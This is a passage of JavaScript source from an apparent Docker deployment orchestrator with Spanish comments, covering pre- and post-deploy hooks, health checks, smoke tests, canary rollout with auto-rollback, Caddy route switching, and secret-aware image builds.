          setStage('pre_deploy');
          await this.ensureNetwork(opts.network, { env: dockerBaseEnv, cacheKey: isRemote ? serverId : null });
          const preName = `${deployment.containerName}_pre`;
          const hookTimeoutMs = Math.min(600000, Math.max(5000, Number(project.hookTimeoutMs) || 120000));
          this.log(deployment, 'INFO', `Ejecutando hook pre-despliegue: ${preHookArgv.join(' ')}`);

          /** @type {string | null} */
          let preEnvFile = null;
          try {
            const createArgs = [
              'create',
              '--name', preName,
              '--network', opts.network,
              '--memory', `${safeMemMb}m`,
              '--memory-swap', `${safeMemMb}m`,
              '--cpus', String(safeCpus),
              '--pids-limit', String(opts.pidsLimit),
              '--security-opt', 'no-new-privileges',
              '--cap-drop', 'ALL',
              '--label', 'culkibo.managed=true',
              '--label', `com.culkibo.project_id=${project.id}`,
              '--label', `com.culkibo.hook=pre_deploy`
            ];
            if (fileOnlyEnvNames.length > 0) {
              fs.mkdirSync(TMP_ENV_DIR, { recursive: true, mode: 0o700 });
              preEnvFile = path.join(TMP_ENV_DIR, `preenv_${crypto.randomBytes(8).toString('hex')}`);
              const lines = fileOnlyEnvNames.map(k => `${k}=${String(envVars[k] == null ? '' : envVars[k]).replace(/[\r\n]+/g, ' ')}`);
              fs.writeFileSync(preEnvFile, lines.join('\n') + '\n', { encoding: 'utf8', mode: 0o600 });
              createArgs.push('--env-file', preEnvFile);
            }
            for (const k of inlineEnvNames) createArgs.push('-e', k);
            // Sobrescribir --entrypoint para que imágenes con ENTRYPOINT fijo ejecuten el hook (Kamal #936)
            createArgs.push('--entrypoint', preHookArgv[0], deployment.imageTag, ...preHookArgv.slice(1));

            const created = await this.runDocker(createArgs, { timeoutMs: 30000, env: childRunEnv, signal: opController.signal, projectId: project.id });
            if (created.code !== 0) {
              const msg = this.redact(created.stderr.trim() || `No se pudo crear contenedor pre-deploy (código ${created.code})`, allSecretValues);
              this.log(deployment, 'ERROR', msg);
              return finish('fallido', msg);
            }

            for (const dbNet of linkedDb.networks) {
              if (dbNet === opts.network) continue;
              await this.runDocker(['network', 'connect', dbNet, preName], { timeoutMs: 10000, env: dockerBaseEnv }).catch(() => {});
            }

            const preRes = await this.runDocker(['start', '-a', preName], {
              timeoutMs: hookTimeoutMs,
              env: dockerBaseEnv,
              signal: opController.signal,
              projectId: project.id,
              onLine: (line) => this.log(deployment, 'INFO', `[pre-deploy] ${this.redact(line, allSecretValues)}`)
            });
            if (preRes.aborted || opController.signal.aborted) {
              return finish('cancelado', 'Despliegue cancelado durante hook pre-despliegue');
            }
            if (preRes.code !== 0) {
              const msg = this.redact(preRes.stderr.trim() || `Hook pre-despliegue falló con código ${preRes.code}`, allSecretValues);
              this.log(deployment, 'ERROR', `Hook pre-despliegue abortado: ${msg.slice(0, 600)}`);
              return finish('fallido', `Hook pre-despliegue falló: ${msg.slice(0, 400)}`);
            }
            this.log(deployment, 'SUCCESS', 'Hook pre-despliegue completado correctamente');
          } finally {
            if (preEnvFile) { try { fs.unlinkSync(preEnvFile); } catch (e) {} }
            await this.runDocker(['rm', '-f', preName], { timeoutMs: 15000, env: dockerBaseEnv }).catch(() => {});
          }
        }

        // --- 3. Arranque del contenedor nuevo --------------------------------
        setStage('arrancando');
        await this.ensureNetwork(opts.network, { env: dockerBaseEnv, cacheKey: isRemote ? serverId : null });

        const hostPort = isRemote
          ? await this._allocateRemotePort(serverId, fleet, remoteDockerHost)
          : await this.findFreePort(20000, deployment.id);
        deployment.hostPort = hostPort;
        this.inFlightContainers.add(deployment.containerName);

        /** @type {string | null} */
        let envFile = null;
        let run;
        try {
          if (fileOnlyEnvNames.length > 0) {
            fs.mkdirSync(TMP_ENV_DIR, { recursive: true, mode: 0o700 });
            envFile = path.join(TMP_ENV_DIR, `depenv_${crypto.randomBytes(8).toString('hex')}`);
            const lines = fileOnlyEnvNames.map(k => `${k}=${String(envVars[k] == null ? '' : envVars[k]).replace(/[\r\n]+/g, ' ')}`);
            fs.writeFileSync(envFile, lines.join('\n') + '\n', { encoding: 'utf8', mode: 0o600 });
          }

          const healthStartPeriodSec = sanitizeBoundedInt(
            options.healthStartPeriodSec !== undefined ? options.healthStartPeriodSec : project.healthStartPeriodSec,
            opts.healthStartPeriodSec,
            0,
            300
          );
          const healthRetries = sanitizeBoundedInt(
            options.healthRetries !== undefined ? options.healthRetries : project.healthRetries,
            opts.healthRetries,
            1,
            10
          );

          const stopGracePeriodSec = sanitizeBoundedInt(
            options.stopGracePeriodSec !== undefined ? options.stopGracePeriodSec : project.stopGracePeriodSec,
            opts.stopGracePeriodSec,
            5,
            300
          );
          const logMaxSizeMb = sanitizeBoundedInt(
            options.logMaxSizeMb !== undefined ? options.logMaxSizeMb : project.logMaxSizeMb,
            opts.logMaxSizeMb,
            1,
            500
          );
          const logMaxFiles = sanitizeBoundedInt(
            options.logMaxFiles !== undefined ? options.logMaxFiles : project.logMaxFiles,
            opts.logMaxFiles,
            1,
            20
          );

          const logDriver = options.logDriver || project.logDriver || opts.logDriver || DEFAULTS.logDriver;
          const runArgs = this.runArgs({
            containerName: deployment.containerName,
            imageTag: deployment.imageTag,
            hostPort,
            containerPort: strategy.containerPort,
            envNames: inlineEnvNames,
            envFile,
            network: opts.network,
            memoryMb: safeMemMb,
            cpus: safeCpus,
            pidsLimit: opts.pidsLimit,
            healthCmd: strategy.injectHealthcheck ? this.healthCommandFor(strategy) : null,
            healthStartPeriodSec,
            healthRetries,
            stopGracePeriodSec,
            logDriver,
            logMaxSizeMb,
            logMaxFiles,
            labels: {
              'culkibo.managed': 'true',
              'com.culkibo.project': safeSlug(project.id),
              'com.culkibo.project_id': project.id,
              'com.culkibo.deployment': deployment.id,
              'com.culkibo.version': version,
              ...(project.protectedContainer || options.protectedContainer || project.sleepEnabled || project.autoSleep || (project.sleepPolicy && project.sleepPolicy.enabled)
                ? { [PROTECTED_CONTAINER_LABEL]: '1' }
                : {})
            }
          });

          run = await this.runDocker(runArgs, { timeoutMs: 60000, env: childRunEnv, signal: opController.signal, projectId: project.id });
        } finally {
          if (!isRemote) this._pendingPorts.delete(hostPort);
          if (envFile) {
            try { fs.unlinkSync(envFile); } catch (e) {}
          }
        }
        const protectedContainers = new Set(
          [state.current && state.current.containerName, state.previous && state.previous.containerName].filter(Boolean)
        );
        if (run.aborted || opController.signal.aborted) {
          await this.forceRemove(deployment.containerName, protectedContainers, { env: dockerBaseEnv });
          return finish('cancelado', 'Despliegue cancelado durante el arranque');
        }
        if (run.code !== 0) {
          const msg = this.redact(run.stderr.trim() || `docker run terminó con código ${run.code}`, allSecretValues);
          this.log(deployment, 'ERROR', `No se pudo arrancar el contenedor: ${msg}`);
          await this.forceRemove(deployment.containerName, protectedContainers, { env: dockerBaseEnv });
          this._pruneFailedImage(deployment.imageTag, state, { env: dockerBaseEnv });
          return finish('fallido', msg);
        }

        // Conectar redes aisladas de bases de datos vinculadas al proyecto
        if (linkedDb.networks.length > 0) {
          for (const dbNet of linkedDb.networks) {
            if (dbNet === opts.network) continue;
            const conn = await this.runDocker(['network', 'connect', dbNet, deployment.containerName], { timeoutMs: 10000, env: dockerBaseEnv });
            if (conn.code !== 0 && !/already exists/i.test(conn.stderr || '')) {
              this.log(deployment, 'WARN', `No se pudo conectar la red de BD ${dbNet}: ${(conn.stderr || '').trim().slice(0, 200)}`);
            }
          }
          this.log(deployment, 'INFO', `Conectado a ${linkedDb.linkedNames.length} base(s) de datos vinculada(s): ${linkedDb.linkedNames.join(', ')}`);
        }
        this.log(deployment, 'INFO', `Contenedor ${deployment.containerName} arrancado en 127.0.0.1:${hostPort}${isRemote ? ` (nodo «${serverId}»)` : ''}`);

        // --- 4. Puerta de salud ---------------------------------------------
        setStage('verificando');
        const primaryHostHeader = deployment.hostnames[0] || null;
        const waitHealthStartSec = sanitizeBoundedInt(
          options.healthStartPeriodSec !== undefined ? options.healthStartPeriodSec : project.healthStartPeriodSec,
          0,
          0,
          300
        );
        const waitHealthyThreshold = sanitizeBoundedInt(
          options.healthyThreshold !== undefined ? options.healthyThreshold : project.healthyThreshold,
          opts.healthyThreshold,
          1,
          5
        );
        const health = await this._withHealthTarget(serverId, fleet, hostPort, (probePort) =>
          this.waitForHealth({
            hostPort: probePort,
            containerPort: strategy.containerPort,
            healthPath: strategy.healthPath,
            containerName: deployment.containerName,
            hostHeader: primaryHostHeader,
            timeoutMs: opts.healthTimeoutMs,
            intervalMs: opts.healthIntervalMs,
            healthStartPeriodSec: waitHealthStartSec,
            healthGraceMs: options.healthGraceMs !== undefined ? options.healthGraceMs : null,
            healthyThreshold: waitHealthyThreshold,
            signal: opController.signal,
            isRemote,
            dockerEnv: dockerBaseEnv,
            onProgress: (m) => this.log(deployment, 'INFO', m)
          })
        );

        if (health.aborted || opController.signal.aborted) {
          await this.forceRemove(deployment.containerName, protectedContainers, { env: dockerBaseEnv });
          return finish('cancelado', 'Despliegue cancelado durante verificación de salud');
        }
        if (!health.healthy) {
          this.log(deployment, 'ERROR', `La versión nueva no pasó la verificación de salud: ${health.reason}`);
          await this.captureContainerLogs(deployment, deployment.containerName, 60, { env: dockerBaseEnv });
          await this.forceRemove(deployment.containerName, protectedContainers, { env: dockerBaseEnv });
          this._pruneFailedImage(deployment.imageTag, state, { env: dockerBaseEnv });
          deployment.__failNotified = true;
          this.notify({
            event: 'deploy_failed',
            level: 'error',
            title: 'Despliegue abortado',
            message: `${deployment.projectName}: la versión nueva no pasó la verificación de salud (${health.reason}). La versión anterior sigue sirviendo tráfico.`,
            projectId: project.id,
            projectName: deployment.projectName
          });
          return finish('fallido', health.reason);
        }
        this.log(deployment, 'SUCCESS', `Verificación de salud superada (HTTP ${health.status} tras ${health.attempts} intentos)`);

        // --- 4.5. Smoke Tests post-despliegue (solo si están configurados) ---
        const smokeCfg = normalizeSmokeConfig(options.smokeTests !== undefined ? options.smokeTests : project.smokeTests);
        if (smokeCfg.enabled && smokeCfg.checks.length > 0) {
          setStage('smoke_test');
          this.log(deployment, 'INFO', `Ejecutando ${smokeCfg.checks.length} smoke test(s) antes de conmutar tráfico...`);
          const smokeRes = await this._withHealthTarget(serverId, fleet, hostPort, (probePort) =>
            this.runSmokeTests(
              isRemote
                ? `127.0.0.1:${probePort}`
                : { hostPort: probePort, containerName: deployment.containerName, containerPort: strategy.containerPort, isRemote: false },
              smokeCfg.checks,
              { hostHeader: primaryHostHeader, signal: opController.signal, secrets: allSecretValues }
            )
          );
          deployment.smokeTestResults = smokeRes;
          if (!smokeRes.ok) {
            const firstErr = (smokeRes.checks.find((c) => !c.ok) || {}).error || smokeRes.summary;
            if (smokeCfg.failPolicy === 'warn') {
              this.log(deployment, 'WARN', `Smoke tests con advertencias (failPolicy=warn): ${smokeRes.summary} (${firstErr})`);
            } else {
              this.log(deployment, 'ERROR', `Smoke tests fallidos antes de promoción: ${smokeRes.summary} — ${firstErr}`);
              await this.captureContainerLogs(deployment, deployment.containerName, 60, { env: dockerBaseEnv });
              await this.forceRemove(deployment.containerName, protectedContainers, { env: dockerBaseEnv });
              this._pruneFailedImage(deployment.imageTag, state, { env: dockerBaseEnv });
              deployment.__failNotified = true;
              this.notify({
                event: 'deploy_failed',
                level: 'error',
                title: 'Smoke tests fallidos',
                message: `${deployment.projectName}: ${smokeRes.summary} (${firstErr}). La versión anterior sigue sirviendo al 100%.`,
                projectId: project.id,
                projectName: deployment.projectName
              });
              return finish('fallido', `Smoke tests fallidos: ${firstErr}`);
            }
          } else {
            this.log(deployment, 'SUCCESS', smokeRes.summary);
          }
        }

        if (this._abortedProjects.has(project.id) || opController.signal.aborted) {
          this.log(deployment, 'WARN', 'Despliegue cancelado antes de promocionar');
          await this.forceRemove(deployment.containerName, protectedContainers, { env: dockerBaseEnv });
          return finish('cancelado', 'Despliegue cancelado');
        }

        // --- 4.8. Canary Auto-Guard (tráfico progresivo + auto-rollback) -----
        const canaryCfg = normalizeCanaryConfig(options.canary !== undefined ? options.canary : project.canary);
        /** @type {any} */
        let resolvedUpstream = null;
        const canRunCanary = Boolean(
          canaryCfg.enabled &&
          state.current &&
          state.current.upstream &&
          deployment.hostnames.length > 0 &&
          !project.maintenanceMode
        );
        if (canRunCanary) {
          resolvedUpstream = await this.resolveUpstream({
            containerName: deployment.containerName,
            containerPort: strategy.containerPort,
            hostPort,
            network: opts.network,
            env: dockerBaseEnv
          });
          deployment.upstream = resolvedUpstream.dial;
          if (resolvedUpstream.warning) {
            this.log(deployment, 'WARN', `No se pudo adjuntar Caddy a la red ${opts.network}: ${resolvedUpstream.warning}`);
          }

          const stableDial = state.current.upstream;
          const stableContainer = state.current.containerName;
          const canaryDial = resolvedUpstream.dial;
          const progressiveSteps = canaryCfg.steps.filter((w) => w < 100);
          if (stableContainer) this.inFlightContainers.add(stableContainer);

          /** @type {any} */
          const canaryState = {
            deploymentId: deployment.id,
            stableDial,
            canaryDial,
            stableContainer,
            canaryContainer: deployment.containerName,
            weight: 0,
            stepIndex: 0,
            steps: canaryCfg.steps,
            startedAt: new Date().toISOString(),
            aborted: false,
            abortReason: null,
            manualPromote: false,
            wake: null,
            restoreStable: async () => {
              await this._withRouteTarget(serverId, fleet, (routeOpts) =>
                this.switchRoute(deployment, deployment.hostnames, stableDial, project, routeOpts)
              );
            }
          };
          this.activeCanaries.set(project.id, canaryState);

          let canaryTotalChecks = 0;
          let canaryFailedChecks = 0;
          /** @type {string | null} */
          let canaryFailureReason = null;
          let failedAtWeight = 0;

          try {
            setStage('canario');
            // Capturar contador base de fallos pasivos de Caddy (best-effort)
            let baselineCaddyFails = 0;
            try {
              const upstreamsNow = await this._withRouteTarget(serverId, fleet, ({ adminUrl }) =>
                caddyManager.getUpstreamsStatus({ adminUrl })
              );
              const found = upstreamsNow.find((u) => u.address === canaryDial);
              if (found) baselineCaddyFails = found.fails;
            } catch (e) {}

            for (let sIdx = 0; sIdx < progressiveSteps.length; sIdx++) {
              const weight = progressiveSteps[sIdx];
              canaryState.weight = weight;
              canaryState.stepIndex = sIdx;
              failedAtWeight = weight;

              const shifted = await this._withRouteTarget(serverId, fleet, (routeOpts) =>
                this.switchCanaryRoute(
                  deployment,
                  deployment.hostnames,
                  { stableDial, canaryDial, canaryWeight: weight },
                  project,
                  routeOpts
                )
              );
              if (!shifted.ok) {
                canaryFailureReason = `No se pudo aplicar peso canario ${weight}%: ${shifted.error}`;
                break;
              }
              this.log(deployment, 'INFO', `Canario activo al ${weight}% (${canaryDial}) / ${100 - weight}% (${stableDial})`);

              const tickIntervalMs = Math.max(10, Math.floor(canaryCfg.stepDurationMs / canaryCfg.checksPerStep));
              for (let tick = 0; tick < canaryCfg.checksPerStep; tick++) {
                if (canaryState.manualPromote) break;
                if (canaryState.aborted || opController.signal.aborted || this._abortedProjects.has(project.id)) {
                  canaryFailureReason = canaryState.abortReason || 'Canario abortado';
                  break;
                }

                // Esperar intervalo de observación (despertable inmediatamente por promote/abort, sin fuga de listeners)
                await new Promise((resolve) => {
                  let done = false;
                  const finishWait = () => {
                    if (done) return;
                    done = true;
                    clearTimeout(timer);
                    canaryState.wake = null;
                    opController.signal.removeEventListener('abort', onAb);
                    resolve(undefined);
                  };
                  const onAb = () => finishWait();
                  const timer = setTimeout(finishWait, tickIntervalMs);
                  canaryState.wake = finishWait;
                  opController.signal.addEventListener('abort', onAb, { once: true });
                });

                if (canaryState.manualPromote) break;
                if (canaryState.aborted || opController.signal.aborted || this._abortedProjects.has(project.id)) {
                  canaryFailureReason = canaryState.abortReason || 'Canario abortado';
                  break;
                }

                // 1. Comprobar salud del contenedor canario (Running & !OOMKilled & RestartCount === 0)
                const insp = await this.runDocker(
                  ['inspect', '-f', '{{.State.Running}}|{{.State.OOMKilled}}|{{.RestartCount}}', deployment.containerName],
                  { timeoutMs: 5000, env: dockerBaseEnv, signal: opController.signal }
                );
                if (insp.code === 0 && (insp.stdout || '').trim()) {
                  const [runFlag, oomFlag, rstRaw] = (insp.stdout || '').trim().split('|');
                  const rstCount = parseInt(rstRaw || '0', 10) || 0;
                  if (runFlag === 'false' || oomFlag === 'true' || rstCount > 0) {
                    canaryFailureReason = oomFlag === 'true'
                      ? 'Contenedor canario terminado por OOMKilled'
                      : rstCount > 0
                        ? `Contenedor canario en bucle de reinicios (${rstCount})`
                        : 'Contenedor canario detenido inesperadamente';
                    break;
                  }
                }

                // 2. Ejecutar smoke tests o sonda HTTP rápida en el canario
                canaryTotalChecks++;
                const canarySmokeList = smokeCfg.checks.length > 0
                  ? smokeCfg.checks
                  : [{ path: strategy.healthPath || '/', expectStatus: '2xx', ...(canaryCfg.maxLatencyMs ? { maxLatencyMs: canaryCfg.maxLatencyMs } : {}) }];
                const tickSmoke = await this._withHealthTarget(serverId, fleet, hostPort, (probePort) =>
                  this.runSmokeTests(
                    isRemote
                      ? `127.0.0.1:${probePort}`
                      : { hostPort: probePort, containerName: deployment.containerName, containerPort: strategy.containerPort, isRemote: false },
                    canarySmokeList,
                    { hostHeader: primaryHostHeader, signal: opController.signal, secrets: allSecretValues }
                  )
                );
                if (!tickSmoke.ok) {
                  canaryFailedChecks++;
                }

                // 3. Comprobar fallos pasivos reales en Caddy (best-effort)
                try {
                  const upstreamsTick = await this._withRouteTarget(serverId, fleet, ({ adminUrl }) =>
                    caddyManager.getUpstreamsStatus({ adminUrl })
                  );
                  const found = upstreamsTick.find((u) => u.address === canaryDial);
                  if (found && found.fails > baselineCaddyFails) {
                    const delta = found.fails - baselineCaddyFails;
                    baselineCaddyFails = found.fails;
                    canaryFailedChecks += delta;
                    canaryTotalChecks += delta;
                  }
                } catch (e) {}

                const errorRate = canaryTotalChecks > 0 ? canaryFailedChecks / canaryTotalChecks : 0;
                if (errorRate > canaryCfg.maxErrorRate) {
                  const failedDetail = (tickSmoke.checks.find((c) => !c.ok) || {}).error || 'tasa de error excedida';
                  canaryFailureReason = `Tasa de error del canario ${(errorRate * 100).toFixed(1)}% superó el límite ${(canaryCfg.maxErrorRate * 100).toFixed(1)}% (${failedDetail})`;
                  break;
                }
              }

              if (canaryFailureReason || canaryState.manualPromote) break;
            }
          } finally {
            this.activeCanaries.delete(project.id);
            if (stableContainer) this.inFlightContainers.delete(stableContainer);
          }

          if (canaryFailureReason) {
            const finalErrRate = canaryTotalChecks > 0 ? canaryFailedChecks / canaryTotalChecks : 1;
            if (canaryCfg.autoRollback !== false) {
              this.log(deployment, 'ERROR', `Auto-rollback canario (<5 ms): restaurando 100% del tráfico a ${stableDial} (${canaryFailureReason})`);
              try {
                await this._withRouteTarget(serverId, fleet, (routeOpts) =>
                  this.switchRoute(deployment, deployment.hostnames, stableDial, project, routeOpts)
                );
              } catch (rbErr) {
                this.log(deployment, 'ERROR', `Error al restaurar ruta estable tras fallo canario: ${rbErr.message}`);
              }
            }
            await this.captureContainerLogs(deployment, deployment.containerName, 60, { env: dockerBaseEnv });
            await this.forceRemove(deployment.containerName, protectedContainers, { env: dockerBaseEnv });
            this._pruneFailedImage(deployment.imageTag, state, { env: dockerBaseEnv });
            deployment.canaryResult = {
              promoted: false,
              rolledBack: canaryCfg.autoRollback !== false,
              failedAtWeight,
              totalChecks: canaryTotalChecks,
              failedChecks: canaryFailedChecks,
              errorRate: Number(finalErrRate.toFixed(4)),
              reason: canaryFailureReason
            };
            this._recordAudit({
              source: options.auditSource || 'system',
              action: 'deploy.canary_rollback',
              resourceId: project.id,
              ip: options.actorIp || null,
              status: 200,
              detail: {
                deploymentId: deployment.id,
                failedAtWeight,
                errorRate: deployment.canaryResult.errorRate,
                reason: canaryFailureReason
              }
            });
            deployment.__failNotified = true;
            this.notify({
              event: 'canary_rollback',
              level: 'warning',
              title: 'Canario revertido automáticamente',
              message: `${deployment.projectName}: ${canaryFailureReason}. Tráfico restaurado al 100% en la versión anterior.`,
              projectId: project.id,
              projectName: deployment.projectName
            });
            return finish('fallido', `Canario revertido automáticamente al ${failedAtWeight}%: ${canaryFailureReason}`);
          }

          deployment.canaryResult = {
            promoted: true,
            rolledBack: false,
            steps: canaryCfg.steps,
            totalChecks: canaryTotalChecks,
            failedChecks: canaryFailedChecks,
            errorRate: canaryTotalChecks > 0 ? Number((canaryFailedChecks / canaryTotalChecks).toFixed(4)) : 0
          };
          this.log(deployment, 'SUCCESS', `Canario verificado correctamente (${canaryTotalChecks} comprobaciones); promoviendo al 100%`);
        }

        // --- 5. Conmutación de la ruta ---------------------------------------
        setStage('promocionando');
        const upstream = resolvedUpstream || await this.resolveUpstream({
          containerName: deployment.containerName,
          containerPort: strategy.containerPort,
          hostPort,
          network: opts.network,
          env: dockerBaseEnv
        });
        deployment.upstream = upstream.dial;
        if (!resolvedUpstream && upstream.warning) {
          this.log(deployment, 'WARN', `No se pudo adjuntar Caddy a la red ${opts.network}: ${upstream.warning}`);
        }

        if (deployment.hostnames.length === 0) {
          this.log(deployment, 'WARN', 'El proyecto no tiene dominios asignados: el servicio queda accesible solo en el host. Añade un dominio para publicarlo.');
        } else {
          const switched = await this._withRouteTarget(serverId, fleet, (routeOpts) =>
            this.switchRoute(deployment, deployment.hostnames, upstream.dial, project, routeOpts)
          );
          if (!switched.ok) {
            this.log(deployment, 'ERROR', `No se pudo conmutar la ruta: ${switched.error}. Se conserva la versión anterior.`);
            await this.forceRemove(deployment.containerName, protectedContainers, { env: dockerBaseEnv });
            return finish('fallido', switched.error);
          }
        }

        // Re-comprobar aborto tras conmutar (cierra ventana race con forget() durante switchRoute)
        if (this._abortedProjects.has(project.id)) {
          try {
            await this._withRouteTarget(serverId, fleet, ({ adminUrl }) => caddyManager.removeRoute(project.id, { adminUrl }));
          } catch (e) {}
          await this.forceRemove(deployment.containerName, protectedContainers, { env: dockerBaseEnv });
          return finish('cancelado', 'Proyecto eliminado durante la promoción');
        }

        // --- 6. Promoción del registro ---------------------------------------
        /** @type {any} */
        const release = {
          deploymentId: deployment.id,
          projectName: deployment.projectName,
          serverId,
          imageTag: deployment.imageTag,
          containerName: deployment.containerName,
          hostPort,
          containerPort: strategy.containerPort,
          upstream: deployment.upstream,
          healthPath: strategy.healthPath,
          hostnames: deployment.hostnames,
          version,
          git: deployment.git,
          promotedAt: new Date().toISOString()
        };
        const retiring = state.current;
        state.previous = retiring || null;
        state.current = release;
        this.saveStore();

        // Actualizar lastDeployedAt y lastCommit en Project únicamente cuando llega a activo
        try {
          const pm = getProjectManager();
          if (pm && typeof pm.getById === 'function' && pm.getById(project.id)) {
            pm.update(project.id, {
              lastDeployedAt: release.promotedAt,
              ...(deployment.git?.shortCommit ? { lastCommit: deployment.git.shortCommit } : {})
            });
          }
        } catch (e) {}

        // --- 6.5. Hook post-deploy (en contenedor recién promocionado) ---------
        if (postHookArgv && postHookArgv.length > 0) {
          setStage('post_deploy');
          const hookTimeoutMs = Math.min(600000, Math.max(5000, Number(project.hookTimeoutMs) || 120000));
          this.log(deployment, 'INFO', `Ejecutando hook post-despliegue: ${postHookArgv.join(' ')}`);
          const postRes = await this.runDocker(['exec', deployment.containerName, ...postHookArgv], {
            timeoutMs: hookTimeoutMs,
            env: dockerBaseEnv,
            onLine: (line) => this.log(deployment, 'INFO', `[post-deploy] ${this.redact(line, allSecretValues)}`)
          });
          if (postRes.code !== 0) {
            const postErr = this.redact(postRes.stderr.trim() || `Hook post-despliegue terminó con código ${postRes.code}`, allSecretValues);
            this.log(deployment, 'WARN', `Hook post-despliegue falló: ${postErr.slice(0, 400)}`);
            if (project.postDeployFailPolicy === 'rollback' && state.previous) {
              this.log(deployment, 'ERROR', 'Política postDeployFailPolicy=rollback: revirtiendo inmediatamente a la versión anterior...');
              // Descartar despliegues pendientes en cola y revertir DENTRO del lock (evita carrera con drainPending, Kamal #1395)
              this.pending.delete(project.id);
              try {
                await this._rollback(project.id, { ...opts, trigger: 'post-deploy-rollback' });
              } catch (rbErr) {
                this.log(deployment, 'ERROR', `Auto-rollback tras fallo de hook post-deploy falló: ${rbErr.message}`);
              }
              return finish('fallido', `Hook post-despliegue falló (revertido a versión anterior): ${postErr.slice(0, 300)}`);
            }
          } else {
            this.log(deployment, 'SUCCESS', 'Hook post-despliegue completado correctamente');
          }
        }

        // --- 7. Drenaje del viejo, en segundo plano ---------------------------
        if (retiring && retiring.containerName !== deployment.containerName) {
          const drain = this.drainAndRetire(deployment, retiring, opts)
            .catch(err => this.log(deployment, 'WARN', `Fallo al retirar la versión anterior: ${err.message}`))
            .finally(() => { if (this.drains.get(project.id) === drain) this.drains.delete(project.id); });
          this.drains.set(project.id, drain);
        }

        this.log(deployment, 'SUCCESS', `Despliegue completado en ${((Date.now() - started) / 1000).toFixed(1)} s — sirviendo ${deployment.imageTag}`);
        this.notify({
          event: 'deploy_succeeded',
          level: 'success',
          title: 'Despliegue completado',
          message: `${deployment.projectName} está sirviendo ${deployment.imageTag}${deployment.hostnames.length ? ` en ${deployment.hostnames.join(', ')}` : ''}.`,
          projectId: project.id,
          projectName: deployment.projectName
        });
        return finish('activo');
      });
    } catch (err) {
      this.log(deployment, 'ERROR', `Error inesperado en el despliegue: ${err.message}`);
      const protectedSet = new Set(
        [state.current && state.current.containerName, state.previous && state.previous.containerName].filter(Boolean)
      );
      try { await this.forceRemove(deployment.containerName, protectedSet, { env: activeDockerEnv }); } catch (e) {}
      return finish('fallido', err.message);
    } finally {
      this._activeOps.delete(project.id);
      this._abortedProjects.delete(project.id);
      this.activeCanaries.delete(project.id);
      this.inFlightContainers.delete(deployment.containerName);
      if (!isRemote && deployment.hostPort) portRegistry.release(deployment.hostPort, deployment.id);
    }
  }

  /**
   * Elimina una imagen recién construida de un despliegue fallido (si no la usa current/previous).
   * @param {string} imageTag
   * @param {any} state
   * @param {{ env?: any }} [opts]
   */
  _pruneFailedImage(imageTag, state, { env = undefined } = {}) {
    if (!imageTag) return;
    if (state?.current?.imageTag === imageTag || state?.previous?.imageTag === imageTag) return;
    this.runDocker(['rmi', imageTag], { timeoutMs: 15000, env }).catch(() => {});
  }

  /**
   * Ejecuta el constructor elegido y transmite su salida como eventos de log.
   * @param {any} deployment
   * @param {{ strategy: any, contextDir: string, project: any, opts: any, envVars: Record<string, any>, signal?: AbortSignal | null, remoteDockerHost?: string | null }} spec
   */
  async runBuild(deployment, { strategy, contextDir, project, opts, envVars, signal = null, remoteDockerHost = null }) {
    const buildArgsMap = project.buildArgs || {};
    let buildSecretsMap = {
      ...(project.buildSecrets && typeof project.buildSecrets === 'object' ? project.buildSecrets : {}),
      ...(opts && opts.buildSecrets && typeof opts.buildSecrets === 'object' ? opts.buildSecrets : {})
    };
    if (Object.values(buildSecretsMap).some((v) => typeof v === 'string' && v.includes('${vault.'))) {
      const envMgr = getEnvironmentManager();
      if (envMgr && typeof envMgr.resolveEnvWithVault === 'function') {
        try {
          const resolved = envMgr.resolveEnvWithVault(buildSecretsMap);
          if (resolved && typeof resolved === 'object') {
            buildSecretsMap = resolved.env && typeof resolved.env === 'object' ? resolved.env : resolved;
          }
        } catch (e) {}
      }
    }
    const secretNames = normalizeBuildSecretNames(buildSecretsMap);
    const secrets = [...Object.values(envVars), ...Object.values(buildArgsMap), ...Object.values(buildSecretsMap)];
    if (Array.isArray(deployment.__secrets)) {
      for (const sv of Object.values(buildSecretsMap)) {
        if (typeof sv === 'string' && sv.length >= 8 && !deployment.__secrets.includes(sv)) {
          deployment.__secrets.push(sv);
        }
      }
    } else {
      Object.defineProperty(deployment, '__secrets', { value: [...secrets], enumerable: false, configurable: true });
    }
    const onLine = (line) => this.log(deployment, 'INFO', line);
    const buildEnv = {
      ...process.env,
      DOCKER_BUILDKIT: '1',
      ...filterSafeHostEnv(buildArgsMap),
      ...filterSafeHostEnv(buildSecretsMap),
      ...(remoteDockerHost ? { DOCKER_HOST: remoteDockerHost } : {})
    };

    if (strategy.builder === 'railpack' || strategy.builder === 'nixpacks') {
      const buildArgNames = Object.keys(buildArgsMap).filter(isValidEnvName);
      const args = this.externalBuilderArgs(strategy.builder, {
        imageTag: deployment.imageTag,
        contextDir,
        envNames: strategy.builder === 'nixpacks' ? buildArgNames : []
      });
      this.log(deployment, 'INFO', `Construyendo con ${strategy.builder}: ${deployment.imageTag}`);
      const res = await this.runTool(strategy.builder, args, {
        timeoutMs: opts.buildTimeoutMs,
        cwd: contextDir,
        env: buildEnv,
        onLine,
        signal,
        projectId: deployment.projectId
      });
      if (res.aborted) return { ok: false, error: 'Construcción cancelada', aborted: true };
      if (res.code !== 0) {
        const msg = this.redact(res.stderr.trim() || `${strategy.builder} terminó con código ${res.code}`, secrets);
        this.log(deployment, 'ERROR', `Fallo de construcción: ${msg.slice(0, 2000)}`);
        return { ok: false, error: msg.slice(0, 600) };
      }
      return { ok: true };
    }

    const buildArgNames = Object.keys(buildArgsMap).filter(isValidEnvName);
    let dockerfile = strategy.dockerfile;
    if (strategy.builder === 'generated') {
      const text = this.generateDockerfile({ ...strategy, projectSlug: safeSlug(project.id), buildArgNames, secretNames });
      if (!text) return { ok: false, error: 'No se ha podido generar un Dockerfile para este stack' };
      const genDir = path.join(contextDir, '.culkibo');
      fs.mkdirSync(genDir, { recursive: true });
      fs.writeFileSync(path.join(genDir, 'Dockerfile'), text, 'utf8');
      const genIgnore = path.join(genDir, 'Dockerfile.dockerignore');
      if (!fs.existsSync(path.join(contextDir, '.dockerignore'))) {
        fs.writeFileSync(genIgnore, this.defaultDockerignore(strategy.stack), 'utf8');
      } else if (fs.existsSync(genIgnore)) {
        try { fs.unlinkSync(genIgnore); } catch (e) {}
      }
      dockerfile = path.join('.culkibo', 'Dockerfile');
      this.log(
        deployment,
        'INFO',
        `Dockerfile generado en .culkibo/Dockerfile (stack: ${strategy.stack}, BuildKit cache mounts aislados${secretNames.length ? `, ${secretNames.length} secreto(s) BuildKit` : ''})`
      );
    }

    const args = this.buildArgs({
      imageTag: deployment.imageTag,
      contextDir,
      dockerfile,
